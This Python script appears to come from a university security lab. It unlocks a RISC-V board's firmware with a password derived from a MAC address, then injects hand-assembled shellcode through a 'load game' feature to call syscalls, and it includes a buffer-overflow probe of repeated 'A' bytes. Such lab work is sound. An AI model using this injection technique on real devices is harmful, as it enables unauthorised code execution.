#!/usr/bin/env python3
try:
    import serial
    import re
    import os
    import time
    import pylink
except ModuleNotFoundError:
    print("Python is missing the serial library")
    quit()
    
riscv_console = '/dev/ttyACM0'
esp32_console = '/dev/ttyACM1'
BAUDRATE = 115200
utf8 = 'utf-8'

lengthi = 2049
lengthb = b"\x00\x00\x08\x00"
secondb = b"\x00\x00\x0F\xFF"
nop = b"\x13\x00\x00\x00"#no operation: addi    x0,x0,0
execbyte = b"\x01"#something != \x00
    
def reset_board():
    shell_command = "echo -en '\\rnh\\nrnh\\nexit\\n' | JLinkExe -device fe310 -If JTAG -speed 4000 -Autoconnect 1 > /dev/null"
    ret = os.system(shell_command)
    print(color.RED + 'Reset board: '+(lambda x: 'success' if (x==0) else 'failed')(ret) + color.END)
    return
    
def reset_board_pylink():
    jlink = pylink.JLink()
    jlink.open()
    jlink.connect('FE310')
    jlink.reset(halt=False)
    jlink.close()

def obtain_mac(esp32):
    while True:
        try:
            line = esp32.readline().decode(utf8)
            mac_matcher = re.compile('wifi: mode : sta \(([^)]+)\)')
            match = re.search(mac_matcher,line)
            if match:
                return match.group(1)
        except Exception as e: 
            print(e)
            break

def send_secret(riscv, secret):
    riscv.flushInput()
    riscv.write(bytes('\n', utf8))#reset buffer
    riscv.write(bytes(secret, utf8))
    
def wait_for_ack(ser, msg):
    while True:
        line = ser.readline().decode(utf8)
        if msg in line:
            print ("Received: "+msg)
            return

def shell():
    os.system("picocom -b 115200 -l --quiet /dev/ttyACM0")
    
def add_test(bytecode):
    bytecode.extend(b"\xb3\xc5\xb5\x00")#xor a1
    bytecode.extend(b"\xb7\xf5\xff\xff")#lui a1 fffff
    bytecode.extend(b"\x93\xe5\xf5\x0f")#ori a1 ff
    bytecode.extend(b"\x33\x46\xc6\x00")#xor a2
    bytecode.extend(b"\x37\x86\x88\x88")#lui a2 88888
    bytecode.extend(b"\x13\x66\x86\x08")#ori a2 88
    return bytecode

def uart_resp(bytecode):
    #set a1 to 0x08001030, a2 to 0x3
    bytecode.extend(b"\xb3\xc5\xb5\x00")
    bytecode.extend(b"\xb7\x15\x00\x08")
    bytecode.extend(b"\x93\xe5\x05\x03")
    bytecode.extend(b"\x33\x46\xc6\x00")
    bytecode.extend(b"\x13\x66\x76\x00")#first number in third byte defines length
    bytecode.extend(nop)
    #bytecode.extend(b"\x\x\x\x")
    #insert at :12instr. = 08001030
    #bytecode.extend(b"GOD\x20"+b"M\x0D\x0A\x00")
    return bytecode
    
def get_userspace_code(length, syscallid):
    #we use register a0 to select our syscall
    ucode = bytearray(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    switcher = {
    1: b"\x15",
    2: b"\x25",
    3: b"\x35",
    4: b"\x45",
    5: b"\x55",
    6: b"\x65"
    }
    ucode.extend(b"\x13\x65"+switcher.get(syscallid, b"\x15")+b"\x00")
    ucode = uart_resp(ucode)
    ucode.extend(b"\x73\x00\x00\x00")#ecall
    #always do exit at the end
    ucode.extend(b"\x33\x45\xa5\x00") #xor     a0,a0,a0
    ucode.extend(b"\x13\x65\x15\x00") #ori a0,a0,0x1
    ucode.extend(b"\x73\x00\x00\x00")#ecall
    #ucode.extend(b"\xFF\x0F\x00\x00")#set buffer length of second load
    ucode.extend(b"\xFF\xFF\xFF\xFF")
    #fill with nops
    for x in range(len(ucode),length-1,len(nop)):
        ucode.extend(nop)
    #execbyte is needed to make the firmware execute the code
    ucode.extend(execbyte)
    return ucode
    
def second_load(ser):    
    sec_code = bytearray(secondb)#secondbufferlength
    sec_code.extend(b"A"*4095)#bei 0x200 512
    sec_code.extend(execbyte)
    input("Press ENTER to continue...")
    print(color.BLUE + "\t\tSent: l to load game"+ color.END)
    ser.write(bytes('l', utf8))
    wait_for_ack(riscv, 'So, you brought your own, he?')
    ser.flushInput()
    ser.write(sec_code)
    return
    
class color:
    BLUE = '\033[94m'
    RED = '\033[91m'
    END = '\033[0m'

if __name__ == '__main__':
    riscv = serial.Serial(riscv_console, BAUDRATE, timeout=1)
    esp32 = serial.Serial(esp32_console, BAUDRATE, timeout=1)
    reset_board_pylink()
    mac = obtain_mac(esp32)
    esp32.close()
    print(color.RED + "MAC found: " +mac+ color.END)
    secret = "__SecLab__"+mac +"\r\n"
    #time.sleep(2)
    wait_for_ack(riscv, 'Welcome.')
    print(color.BLUE + "\t\tSent: Secret Password" + color.END)
    send_secret(riscv, secret)
    wait_for_ack(riscv, 'Greetings Professor Falken. Shall we play a game?')
    input("Press ENTER to continue...")
    print(color.BLUE + "\t\tSent: l to load game"+ color.END)
    riscv.write(bytes('l', utf8))
    wait_for_ack(riscv, 'So, you brought your own, he?')
    syscall = int(input("Enter syscall id: "))
    code = get_userspace_code(lengthi, syscall)
    print(color.BLUE + "\t\tSent: Game code" + color.END)
    riscv.flushInput()
    riscv.write(lengthb)
    riscv.write(code)
    wait_for_ack(riscv, 'What do you want to play?')
    print(color.RED + "Successfully went back to menu" + color.END)
    #sec_load(riscv)
    riscv.close()
    print(color.RED + "Task done, switching to picocom console, exit with CRTL+A+X" + color.END)
    shell()

#a1 = 08001030, a2 = 3
